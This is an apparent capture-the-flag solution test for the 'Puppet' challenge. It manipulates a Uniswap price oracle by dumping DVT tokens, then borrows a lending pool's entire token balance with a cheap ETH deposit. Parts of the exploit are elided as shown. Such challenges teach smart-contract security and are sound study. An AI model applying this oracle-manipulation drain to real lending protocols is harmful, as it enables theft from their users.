...
describe("[Challenge] Puppet", function () {
  ...
  it("Execution", async function () {
    ...
    // 1. approve uniswap exchange contract to spend all your DVT tokens
    const playerTokenBalance = await this.token.balanceOf(player.address);
    await this.token
      .connect(player)
      .approve(this.uniswapExchange.address, playerTokenBalance);

    // 2. swap all 1000 DVT tokens for ETH to manipulate the price oracle
    ...
    // 2. call `calculateDepositRequired()` to get amount of ETH needed for the borrow all tokens in lending pool
    const poolTokenBalance = await this.token.balanceOf(
      this.lendingPool.address
    );
    const requiredDepositInEth =
      await this.lendingPool.calculateDepositRequired(poolTokenBalance);

    // 3. borrow the entire DVT tokens in contract
    await this.lendingPool
      .connect(player)
      .borrow(poolTokenBalance, { value: requiredDepositInEth });
  });
